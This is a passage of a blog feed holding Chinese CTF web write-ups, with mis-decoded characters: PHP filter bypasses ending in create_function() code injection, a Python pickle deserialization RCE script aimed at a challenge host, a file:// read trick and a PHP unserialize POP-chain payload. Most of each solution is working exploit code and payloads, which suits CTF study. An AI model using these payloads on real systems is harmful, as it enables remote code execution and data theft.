class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span> </code></pre><p>å…³äºŽç¬¬ä¸€å¤„é™åˆ¶ï¼š</p><pre><code>if($_SERVER) {     if (        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])        )          die('You seem to want to do something bad?'); } </code></pre><p>å…³äºŽ<code>$_SERVER['QUERY_STRING']</code>.ä»–éªŒè¯çš„æ—¶å€™æ˜¯ä¸ä¼šè¿›è¡Œurlè§£ç çš„ï¼Œä½†æ˜¯åœ¨GETçš„æ—¶å€™åˆ™ä¼šè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†å…³é”®è¯ç¼–ç å°±èƒ½ç»•è¿‡ã€‚</p><p>å…³äºŽç¬¬äºŒå¤„é™åˆ¶ï¼š</p><pre><code>if (!preg_match('/http|https/i', $_GET['file'])) {    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') {        $file = $_GET["file"];        echo "Neeeeee! Good Job!&lt;br&gt;";    }} else die('fxck you! What do you want to do ?!');</code></pre><p><code>preg_match</code>å€¼åŒ¹é…ç¬¬ä¸€è¡Œï¼Œå¥å°¾åŠ ä¸Š%0aè¿›è¡Œç»•è¿‡ï¼Œç»•è¿‡<code>preg_match</code>ä¸»è¦æœ‰ä¸¤ç§æ–¹æ³•å³æ¢è¡Œç¬¦ä¸ŽPRCEå›žæº¯æ­¤å¤„è¶…å‡ºã€‚</p><p>payloadï¼š<code>dedu=aqua_is_cute%0a</code></p><p>å…³äºŽç¬¬ä¸‰å¤„é™åˆ¶ï¼š</p><pre><code>if($_REQUEST) {     foreach($_REQUEST as $value) {         if(preg_match('/[a-zA-Z]/i', $value))              die('fxck you! I hate English!');     } }  </code></pre><p><code>$_REQUEST</code>æ–¹å¼æŽ¥æ”¶è¯·æ±‚æ˜¯å­˜åœ¨ä¼˜å…ˆçº§åˆ«çš„ï¼Œå¦‚æžœåŒæ—¶æŽ¥å—GETå’ŒPOSTçš„æ•°æ®ï¼Œé»˜è®¤æƒ…å†µä¸‹POSTå…·æœ‰ä¼˜å…ˆæƒï¼Œæ‰€ä»¥åªéœ€è¦åœ¨getçš„åŒæ—¶postæ•°å­—å³å¯ã€‚</p><p>payloadï¼š<code>POSTï¼šdebu=1&amp;file=1</code></p><p>å…³äºŽç¬¬å››å¤„é™åˆ¶ï¼š</p><pre><code>if (file_get_contents($file) !== 'debu_debu_aqua')    die("Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"); </code></pre><p>è¿™é‡Œåˆ©ç”¨dataåè®®å³å¯ï¼š<code>file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61</code></p><p>ä¸Žæ­¤åŒæ—¶fileä¹Ÿéœ€è¦è¢«postä¸€ä¸‹ã€‚</p><p>å…³äºŽç¬¬å››å¤„é™åˆ¶ï¼š</p><pre><code>if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd ){    extract($_GET["flag"]);    echo "Very good! you know my password. But what is flag?&lt;br&gt;";} else{    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");} </code></pre><p>è¿™é‡Œåˆ©ç”¨æ•°ç»„è¿›è¡Œä¸€ä¸‹ç»•è¿‡å°±å¯ä»¥äº†ï¼Œå› ä¸ºå½“sha1()çš„å‚æ•°ä¸ºæ•°ç»„ï¼Œæ­¤æ—¶å°±ä¼šè¿”å›žfalseã€‚</p><p>payloadï¼š<br> <code>shana[]=1&amp;passwd[]=2</code>  </p><p>å…³äºŽç¬¬äº”å¤„é™åˆ¶ï¼š  </p><pre><code>if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) {     die("&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); } else {     include "flag.php";    $code('', $arg); } ?&gt;</code></pre><p>è¿™é‡Œåˆ©ç”¨åˆ°äº†<code>create_function()</code>ä»£ç æ³¨å…¥ã€‚</p><p><code>create_function()</code>å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°$argså’Œ$codeï¼Œç”¨äºŽåˆ›å»ºä¸€ä¸ªlambdaæ ·å¼çš„å‡½æ•°</p><p>ä¾‹å¦‚ï¼š<code>$myfunc = create_function('$a, $b', 'return $a+$b;');</code><br> ç›¸å½“äºŽï¼š  </p><pre><code>function myfunc($a, $b){    return $a+$b;}    </code></pre><p>ä¸Žæ­¤åŒæ—¶å½“ç¬¬äºŒä¸ªå‚æ•°æ— é™åˆ¶æ—¶ï¼š</p><pre><code>$code=return $a+$b;}eval($_POST['cmd']);//</code></pre><p>å°±ä¼šå˜æˆï¼š</p><pre><code>function myfunc($a, $b){    return $a+$b;}eval($_POST['cmd']);//}  </code></pre><p>çœ‹åˆ°è¿™é“é¢˜ï¼Œåœ¨ä¸Šä¸€é˜¶æ®µsha1æ¯”è¾ƒçš„è¿‡ç¨‹ä¸­ï¼Œ<code>extract($_GET["flag"]);</code>è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œä»Žè€ŒæŽŒæŽ§ä½argå˜é‡ä¸Žcodeå˜é‡ã€‚<br> åŒæ—¶æ ¹æ®ä¸Šé¢çš„ä»‹ç»æˆ‘ä»¬å¯ä»¥é€šè¿‡å¿…å’Œç¬¦å·æ¥æ‰§è¡Œè‡ªå·±å®šä¹‰çš„å‡½æ•°ï¼š  </p><pre><code>&amp;flag[arg]=}a();//&amp;flag[code]=create_function</code></pre><p>æ‹¼æŽ¥è¿‡åŽå°±åº”è¯¥æ˜¯ï¼š    </p><pre><code>function {}a();//}</code></pre><p>è¿™æ ·å­äº†ã€‚  </p><p>è¿™ä¸ªaæˆ‘ä»¬æ˜¯å¯ä»¥éšæ—¶æ”¹æˆå…¶ä»–çš„å‡½æ•°çš„ã€‚  </p><p>ä½†æ˜¯æ­¤æ—¶å¾ˆå¤šå‡½æ•°éƒ½è¢«ç¦ç”¨äº†ï¼Œæ–‡ä»¶ä¸­åŒ…å«äº†flagè¿™ä¸ªæ–‡ä»¶ï¼Œåˆ©ç”¨<code>get_defined_vars()</code>å°†æ‰€æœ‰å˜é‡ä¸Žå€¼éƒ½è¿›è¡Œè¾“å‡ºï¼Œæ­¤æ—¶payloadå°±ä¸ºï¼š  </p><pre><code>flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></pre><p>è¾“å‡ºå‡ºæ¥ä½†è¿˜ä¸æ˜¯çœŸæ­£çš„flagï¼Œæç¤ºæˆ‘ä»¬æ˜¯åœ¨å¦ä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œflag4.phpï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥åˆ©ç”¨requireï¼Œæ¥ä»£æ›¿includeï¼Œåˆ©ç”¨base64ç¼–ç ç»•è¿‡flagçš„è¿‡æ»¤ï¼Œåˆ©ç”¨require()æ¥ä»£æ›¿requireâ€ â€œã€‚  </p><p>payloadï¼š<code>flag[arg]=}require(base64_decode(xxxxxxx));var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></p><p>éžé¢„æœŸè§£ï¼šåˆ©ç”¨å¼‚æˆ–æˆ–è€…~è¿›è¡Œå–åæ“ä½œã€‚</p><p>æœ€ç»ˆpayload:<br> GET:</p><pre><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e</code></pre><p>POST:</p><pre><code>debu=1&amp;file=1</code></pre><pre><code>/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=data://text/plain,%61%71%75%61%5f%69%73%5f%63%75%74%65&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=}var_dump(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//&amp;%66%6c%61%67[%63%6f%64%65]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6efile=1&amp;debu=2</code></pre><pre><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é•¿åŸŽæ¯2021</title>
      <link href="2021/09/25/chang-cheng-bei-2021/"/>
      <url>2021/09/25/chang-cheng-bei-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><h5 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>send_from_directory<span class="token keyword">import</span> os<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">from</span> flask <span class="token keyword">import</span> send_fileapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> b<span class="token string">'R'</span> <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">return</span> <span class="token number">1</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        user <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">:</span>            user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>user<span class="token punctuation">)</span>            username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            username <span class="token operator">=</span> <span class="token string">"bad,bad,hacker"</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token string">"CTFer"</span>     pic <span class="token operator">=</span> <span class="token string">'{0}.jpg'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pic<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'pic'</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>pic<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            base64_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> base64_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        pic<span class="token operator">=</span><span class="token string">'{0}.jpg'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>pic<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            base64_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> base64_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> uname<span class="token operator">=</span>username<span class="token punctuation">,</span> pic<span class="token operator">=</span>p <span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span></code></pre><h5 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h5><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#e = 'ls / -a'</span>e <span class="token operator">=</span> <span class="token string">'cat /flagggggggggggggaaa'</span>s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># print(s)</span>payload <span class="token operator">=</span> b<span class="token string">'c__main__\nUser\n)\x81}(V__setstate__\ncos\nsystem\nubV'</span> <span class="token operator">+</span> \    e<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">' > /tmp/1.txt\nb.'</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://eci-2zedqu5w4d2328dulcrt.cloudeci1.ichunqiu.com:8888/?pic=/tmp/1.txt"</span><span class="token punctuation">,</span>cookies<span class="token operator">=</span>dict<span class="token punctuation">(</span>    user<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> l <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"base64"</span> <span class="token keyword">in</span> l<span class="token punctuation">:</span>        l <span class="token operator">=</span> l<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="java-url"><a href="#java-url" class="headerlink" title="java_url"></a>java_url</h2><pre><code>testURL?url=url:file:///flag</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2021-9</title>
      <link href="2021/09/25/dasctf2021-9/"/>
      <url>2021/09/25/dasctf2021-9/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'No!No!No!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>             <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//There is no code to print flag in flag.php</span>            <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token string">"Nice Job!!"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$aaa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li><strong>__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</strong></li><li><strong>__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</strong></li></ul><h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token operator">=</span><span class="token string">"create_function"</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token operator">=</span>"<span class="token punctuation">}</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span>VHJ1M2ZsYWcucGhw<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">get_defined_vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//";</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre><code>?pop=O:1:"A":1:{s:3:"var";O:1:"B":2:{s:4:"func";s:15:"create_function";s:3:"arg";s:73:"}require(base64_decode(VHJ1M2ZsYWcucGhw));var_dump(get_defined_vars());//";}}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webæºç æ³„éœ²åŠå·¥å…·åˆ©ç”¨</title>
      <link href="2021/09/21/web-yuan-ma-xie-lu-ji-gong-ju-li-yong/"/>
